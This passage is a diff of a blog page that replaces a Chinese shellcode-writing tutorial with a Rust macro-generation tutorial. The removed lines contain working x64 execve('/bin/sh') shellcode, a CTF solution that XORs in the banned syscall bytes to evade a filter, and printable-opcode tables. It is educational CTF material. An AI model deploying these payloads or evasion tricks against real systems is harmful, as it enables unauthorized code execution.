@@ -34,19 +34,19 @@
     var CONFIG = {"hostname":"hacbit.tech","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Shellcode编写入门为什么要手写shellcode？现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。">
+  <meta name="description" content="Rust宏魔法——第二辑（   又来整点奇技淫巧了  这期就玩玩用声明宏来生成宏（ 总结可以直接看 👉 省流 假设有以下的奇怪情景：    你整了一个日志系统，但是其中的输出内容是预设好的（当然也应该预留一个比如 Other 的来自定义内容）   然后你想要给每一种输出内容都注册一个宏，并且有些输出是带有 “{}” 的，因此你希望能够有类似下面这个效果：   12app_start_failed">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Shellcode编写入门">
-<meta property="og:url" content="http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:title" content="rust宏魔法-2">
+<meta property="og:url" content="http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/index.html">
 <meta property="og:site_name" content="hacbit&#39;s blog">
-<meta property="og:description" content="Shellcode编写入门为什么要手写shellcode？现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。">
+<meta property="og:description" content="Rust宏魔法——第二辑（   又来整点奇技淫巧了  这期就玩玩用声明宏来生成宏（ 总结可以直接看 👉 省流 假设有以下的奇怪情景：    你整了一个日志系统，但是其中的输出内容是预设好的（当然也应该预留一个比如 Other 的来自定义内容）   然后你想要给每一种输出内容都注册一个宏，并且有些输出是带有 “{}” 的，因此你希望能够有类似下面这个效果：   12app_start_failed">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-09-14T06:29:38.000Z">
-<meta property="article:modified_time" content="2024-04-29T10:24:44.976Z">
+<meta property="article:published_time" content="2024-08-26T14:31:29.000Z">
+<meta property="article:modified_time" content="2024-08-26T15:26:31.509Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/">
+<link rel="canonical" href="http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/">
 
 
 <script id="page-configurations">
@@ -59,7 +59,7 @@
   };
 </script>
 
-  <title>Shellcode编写入门 | hacbit's blog</title>
+  <title>rust宏魔法-2 | hacbit's blog</title>
   
 
 
@@ -214,7 +214,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/">
+    <link itemprop="mainEntityOfPage" href="http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -227,7 +227,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Shellcode编写入门
+          rust宏魔法-2
         </h1>
 
         <div class="post-meta">
@@ -237,16 +237,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2023-09-14 14:29:38" itemprop="dateCreated datePublished" datetime="2023-09-14T14:29:38+08:00">2023-09-14</time>
+              <time title="Created: 2024-08-26 22:31:29 / Modified: 23:26:31" itemprop="dateCreated datePublished" datetime="2024-08-26T22:31:29+08:00">2024-08-26</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-04-29 18:24:44" itemprop="dateModified" datetime="2024-04-29T18:24:44+08:00">2024-04-29</time>
-              </span>
 
           
             <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
@@ -261,14 +255,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>3.3k</span>
+              <span>732</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>6 mins.</span>
+              <span>1 mins.</span>
             </span>
 
         </div>
@@ -280,266 +274,50 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Shellcode编写入门"><a href="#Shellcode编写入门" class="headerlink" title="Shellcode编写入门"></a>Shellcode编写入门</h1><h2 id="为什么要手写shellcode？"><a href="#为什么要手写shellcode？" class="headerlink" title="为什么要手写shellcode？"></a>为什么要手写shellcode？</h2><p>现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。</p>
+        <h1 id="Rust宏魔法——第二辑（"><a href="#Rust宏魔法——第二辑（" class="headerlink" title="Rust宏魔法——第二辑（"></a>Rust宏魔法——第二辑（</h1><blockquote>
+<p>  又来整点奇技淫巧了</p>
+</blockquote>
+<p>这期就玩玩用声明宏来生成宏（</p>
+<p>总结可以直接看 👉 <a href="#%E7%9C%81%E6%B5%81">省流</a></p>
+<p>假设有以下的奇怪情景：</p>
+<blockquote>
+<p>  你整了一个日志系统，但是其中的输出内容是预设好的（当然也应该预留一个比如 Other 的来自定义内容）</p>
+<p>  然后你想要给每一种输出内容都注册一个宏，并且有些输出是带有 “{}” 的，因此你希望能够有类似下面这个效果：</p>
+  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app_start_failed!(e)</span><br><span class="line"><span class="comment">// App start failed due to the error : &#123;e&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>  也就是像 <code>println!</code> 之类的宏能够接受不定数量的参数，具体看格式（也就是你预设字符串里面有几个 “{}” )</p>
+</blockquote>
 <span id="more"></span>
 
-<h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>当然也不可否认shellcode生成工具的便捷性。适当利用也可以辅助我们来编写适合的shellcode。<br>常用的当然是pwntools模块下的shellcraft，比如shellcraft.sh()来生成execve(‘&#x2F;bin&#x2F;sh’,0,0)的汇编代码，还有shellcraft.open(‘flag’,0), shellcode.cat(‘flag’)等等，可以非常方便的生成指定架构下的汇编，<strong>但是pwntools会考虑很多情况（毕竟要考虑通用性的），所以肯定会比较长，实际上是有很大改进空间的</strong>。本篇的目的不是让读者从0开始写shellcode（写的多了也差不多可以直接搓了），只要能改进生成工具生成的shellcode以符合条件就可以了。</p>
-<h2 id="从简化工具生成的shellcode开始"><a href="#从简化工具生成的shellcode开始" class="headerlink" title="从简化工具生成的shellcode开始"></a>从简化工具生成的shellcode开始</h2><p><strong>本篇以execve(‘&#x2F;bin&#x2F;sh’,0,0)为例</strong></p>
-<p>假定我们的架构是x64的<br>先用pwntools生成一段来看看</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcraft.sh()</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
 
-<p>发现前面<code>push 0x68</code>， 和<code>mov rax，0x732f2f2f6e69622f</code> ,<code>push rax</code> 是把&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00push到栈上，但是如果没有对&#x2F;bin&#x2F;sh字符串做检测的话可以直接传&#x2F;bin&#x2F;sh\x00, 或者&#x2F;bin&#x2F;&#x2F;sh，所以可以简化为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br></pre></td></tr></table></figure>
 
-<p><code>mov rdi, rsp</code>是把指向&#x2F;bin&#x2F;sh字符串的指针传给rdi寄存器，（因为execve的第一个参数实际上需要的是字符串的地址），由于刚刚把&#x2F;bin&#x2F;sh字符串push到栈上（此时在栈顶，也就说rsp此时指向&#x2F;bin&#x2F;sh），所以可以通过mov rdi，rsp把&#x2F;bin&#x2F;sh地址传给rdi寄存器。</p>
-<p>这里非要改的话可以改成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rsp</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>
+<p>为了方便演示，就以以下作为例子吧</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app_started : <span class="string">&quot;App start!&quot;</span></span><br><span class="line">app_start_failed : <span class="string">&quot;App start failed due to the error: &#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>这样子编译后只有2个字节，原来的用mov传参有3个字节，改写的操作就是把rsp的值push到栈上，在pop到rdi，也能起到传参的效果</p>
-<p><code> push 0x1010101 ^ 0x6873</code>    <code>xor dword ptr [rsp], 0x1010101</code></p>
-<p>这两步应该是为了绕过潜在的sh字串检测，所以先传一个异或后的值，后面再异或回sh，</p>
-<p>如果没有检测的话是可以直接<code>push 0x6873</code> <del><strong>（其实感觉这一大段都没什么用）</strong></del></p>
-<p>后面的<code>xor esi, esi</code>是把rsi置零，使用esi，而不用rsi，是因为用esi编译的字节会少</p>
-<p>然后push 8， pop rsi，就是相当于<code>mov rsi, 8</code>， 用push pop编译出来的更小</p>
-<p><strong>但是直接push一个值到栈上要注意：</strong></p>
-<blockquote>
-<p>  push 只能push一个32位数，超过32位不能编译（起码用pwntools的asm是这样子）</p>
-<p>  push 超过一个字节的数，会自动补全成32位，比如push 0x6873，就会编译为 hsh\x00\x00</p>
-<p>  但是如果只是push一个字节，就会编译为2个字节，比如push 0x8，机器码为 j\x08</p>
-</blockquote>
-<p>后面这段没搞清楚目的是什么，如果只是为了把rsi和rdx置0的话，只需要2行xor就可以了</p>
-<p>最后要给一个系统调用号给rax（x64架构execve调用号是0x3b）</p>
-<p>最后syscall，完成调用！</p>
-<p><del><strong>很好，你已经学会怎么搓shellcode了</strong></del></p>
-<p><strong>完整的汇编码：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f	/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi			/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi	/* rsi = 0 */</span><br><span class="line">xor edx, edx	/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>如果只是考虑上面这种，应该很容易写成这样：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            <span class="meta">#[macro_export]</span></span><br><span class="line">            <span class="built_in">macro_rules!</span> $id &#123;</span><br><span class="line">                () =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e);</span><br><span class="line">    			&#125;;</span><br><span class="line">                ($tt:tt) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e, $tt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">generate_macros! &#123;</span><br><span class="line">    app_started =&gt; <span class="string">&quot;App start!&quot;</span>,</span><br><span class="line">    app_start_failed =&gt; <span class="string">&quot;App start failed due to the error: &#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    app_started!();</span><br><span class="line">    app_start_failed!(<span class="string">&quot;AAAAAAA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>编译成机器码看一看</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f	/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi			/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi	/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx	/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这样自然能够正常运行，但是也不难发现问题，就是如果增加了一个有两个 “{}” 的字段，那就不得不给 generate_macros 里面新增一个规则。</p>
+<p>当然，对于 macro 烂熟于心的你，肯定想到可以把这个里面的匹配模式统一成  <code>$($tt:tt)*</code> ，也就是类似下面这种：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            <span class="meta">#[macro_export]</span></span><br><span class="line">            <span class="built_in">macro_rules!</span> $id &#123;</span><br><span class="line">                ($($tt:tt)*) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e, $tt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>只有0x16（22）个字节！！！</strong></p>
-<p>再看看原来的shellcode的机器码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span>)</span><br><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure>
+<p>直接自信运行！</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">error: attempted to repeat an expression containing no syntax variables matched as repeating at this depth</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">9</span>:<span class="number">19</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">9</span> |                 (<span class="variable">$</span>(<span class="variable">$tt:tt</span>)*) =&gt; &#123;</span><br><span class="line">  |                   ^^^^^^^</span><br></pre></td></tr></table></figure>
 
-<p>我们缩减了一半多的shellcode代码，并且执行相同的功能，这就是手搓汇编带来的（）</p>
-<h2 id="OK，你已经学会手搓了，现在来实战吧"><a href="#OK，你已经学会手搓了，现在来实战吧" class="headerlink" title="OK，你已经学会手搓了，现在来实战吧"></a>OK，你已经学会手搓了，现在来实战吧</h2><h3 id="moectf-changeable-shellcode"><a href="#moectf-changeable-shellcode" class="headerlink" title="moectf changeable_shellcode"></a>moectf changeable_shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p>
-<p>简单来说就是过滤了 <code>\x0f\x05</code> 然后shellcode长度不超过 0x28</p>
-<p>一种思路是直接在后面通过异或之类的方法把syscall写在后面</p>
-<p>可以先栈迁移到rwx段，当然为了避免对栈操作影响到原来写的shellcode，所以我这里就 add了 0x40</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsp</span><br><span class="line">add rsp, 0x40</span><br></pre></td></tr></table></figure>
+<p>报错了，悲（</p>
+<p>这个原因主要是像 <code>$( #[macro_export] xxxxx )*</code> 这样，被递归展开了，但是在 <code>macro_rules! $id &#123;&#125;</code> 中这么写，就不知道什么时候结束，因为 <code>$tt</code> 也是没有在 <code>macro_rules! generate_macros</code> 中声明（</p>
+<p>但是这里如果是通过 <code>proc-macro</code> 包上一层就可以正确解析了</p>
+<p>新建一个 <code>proc-macro</code> 类型的crate，写上以下代码</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> proc_macro;</span><br><span class="line"><span class="keyword">use</span> proc_macro::TokenStream;</span><br><span class="line"><span class="keyword">use</span> quote::quote;</span><br><span class="line"><span class="keyword">use</span> syn::&#123;parse_macro_input, parse::&#123;Parse, ParseBuffer&#125;, Token, Ident, LitStr&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MacroInfo</span> &#123;</span><br><span class="line">    id: Ident,</span><br><span class="line">    msg: LitStr,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Parse</span> <span class="keyword">for</span> <span class="title class_">MacroInfo</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">parse</span>(input: &amp;ParseBuffer) <span class="punctuation">-&gt;</span> syn::<span class="type">Result</span>&lt;<span class="keyword">Self</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = input.parse::&lt;Ident&gt;()?;</span><br><span class="line">        input.parse::&lt;Token![=&gt;]&gt;()?;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">msg</span> = input.parse::&lt;LitStr&gt;()?;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="keyword">Self</span> &#123; id, msg &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[proc_macro]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">make_macro</span>(input: TokenStream) <span class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> MacroInfo);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">id</span> = &amp;input.id;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">msg</span> = &amp;input.msg;</span><br><span class="line">    </span><br><span class="line">    quote! &#123;</span><br><span class="line">        <span class="built_in">macro_rules!</span> #id &#123;</span><br><span class="line">            ($($tt:tt)*) =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(#msg, $($tt)*);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后就是正常构造 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br><span class="line">push rax	# 把 /bin/sh\0 push到栈顶</span><br><span class="line">push rsp	# 把 binsh字符串地址push到栈顶</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi</span><br><span class="line">xor edx, edx</span><br><span class="line">xor eax, 0x6e696720 # 异或构造 \x0f\x05</span><br><span class="line">push rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">push rsp	# 此时rsp指向 \x0f\x05 (syscall)</span><br><span class="line">ret			# 把syscall地址push到栈顶就可以跳转过去getshell了</span><br></pre></td></tr></table></figure>
+<p>然后 <code>generate_macros</code> 这边替换一下就好了</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            make_macro! &#123;</span><br><span class="line">                $id =&gt; $e</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这个shellcode就只需要 0x22 bytes完全够用</p>
-<h2 id="一些特殊的要求的shellcode"><a href="#一些特殊的要求的shellcode" class="headerlink" title="一些特殊的要求的shellcode"></a>一些特殊的要求的shellcode</h2><h3 id="可见字符限制"><a href="#可见字符限制" class="headerlink" title="可见字符限制"></a>可见字符限制</h3><p>有时候会遇到shellcode只能使用可见字符的限制</p>
-<ul>
-<li>大部分寄存器的push pop都是可见的，而且除了r15，r14这类的，基本都是1一个字节，这对于某些限制长度的情况下特别好用</li>
-<li>部分xor，sub， and等操作</li>
-</ul>
-<p>我这里简单列了个表（</p>
-<blockquote>
-<p>  reg 表示寄存器，后面的数字是位数，比如 reg8， 就是8位（也就是1字节）的寄存器，比如 al，ah寄存器，reg16如 ax，di寄存器</p>
-<table>
-<thead>
-<tr>
-<th>reg</th>
-<th>include</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>reg8</td>
-<td>al, ah, bl, bh, cl, ch, dl, dh, spl, bpl, sil, dil, r8b, r9b, r10b, r11b, r12b, r13b, r14b, r15b</td>
-</tr>
-<tr>
-<td>reg16</td>
-<td>ax, bx, cx, dx, sp, bp, si, di, r8w, r9w, r10w, r11w, r12w, r13w, r14w, r15w</td>
-</tr>
-<tr>
-<td>reg32</td>
-<td>eax, ebx, ecx, edx, esp, ebp, esi, edi, r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</td>
-</tr>
-<tr>
-<td>reg64</td>
-<td>rax, rbx, rcx, rdx, rsp, rbp, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15</td>
-</tr>
-</tbody></table>
-<p>  im 表示立即数，后面的数字也是代表位数， 比如 0x4141 就是 im16 （2字节立即数）</p>
-<p>  mem 表示内存地址，后面的数字表示取从该地址开始的多少位，比如 mem8 表示取该地址开始的1字节，会与 [] 配合使用</p>
-<p>  [xxx] 表示解引用，这和正常的intel asm语法差不多，比如 xor ax, [rbx]</p>
-<p>  上面的例子中， [rbx] 就是一个 [mem16]， 是因为前面ax是16位所以能推导出 [rbx] 需要取2字节，当然也可以显示的通过 qword， dword， word， byte来指定取8&#x2F;4&#x2F;2&#x2F;1 字节</p>
-</blockquote>
-<h4 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push &amp; pop"></a>push &amp; pop</h4><table>
-<thead>
-<tr>
-<th>汇编</th>
-<th>机器码</th>
-<th>汇编</th>
-<th>机器码</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>pop rax</td>
-<td>X</td>
-<td>push rax</td>
-<td>P</td>
-</tr>
-<tr>
-<td>pop rcx</td>
-<td>Y</td>
-<td>push  rcx</td>
-<td>Q</td>
-</tr>
-<tr>
-<td>pop rdx</td>
-<td>Z</td>
-<td>push  rdx</td>
-<td>R</td>
-</tr>
-<tr>
-<td>pop rbx</td>
-<td>[</td>
-<td>push  rbx</td>
-<td>S</td>
-</tr>
-<tr>
-<td>pop rsp</td>
-<td>\</td>
-<td>push  rsp</td>
-<td>T</td>
-</tr>
-<tr>
-<td>pop rbp</td>
-<td>]</td>
-<td>push  rbp</td>
-<td>U</td>
-</tr>
-<tr>
-<td>pop rsi</td>
-<td>^</td>
-<td>push  rsi</td>
-<td>V</td>
-</tr>
-<tr>
-<td>pop rdi</td>
-<td>_</td>
-<td>push  rdi</td>
-<td>W</td>
-</tr>
-<tr>
-<td>pop r8</td>
-<td>AX</td>
-<td>push  r8</td>
